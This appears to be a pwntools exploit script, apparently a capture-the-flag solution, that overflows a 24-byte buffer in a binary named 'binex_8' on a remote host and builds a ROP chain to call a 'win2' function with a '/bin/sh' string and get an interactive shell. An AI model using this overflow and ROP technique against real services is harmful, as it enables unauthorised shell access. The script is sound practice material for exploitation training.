#!usr/bin/python3
from pwn import *

exe = './binex_8'
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(exe)
context.log_level = 'debug'
host,port = '165.22.109.88', 1031

io = remote(host, port)

bss = elf.bss()
offset = 24
payload = flat({
    offset: [
        rop.rdi.address,
        0x400795,           # /bin/sh\x00, trimming win1 string
        rop.ret.address,
        elf.sym['win2']
    ]
})

io.sendline(payload)
io.interactive()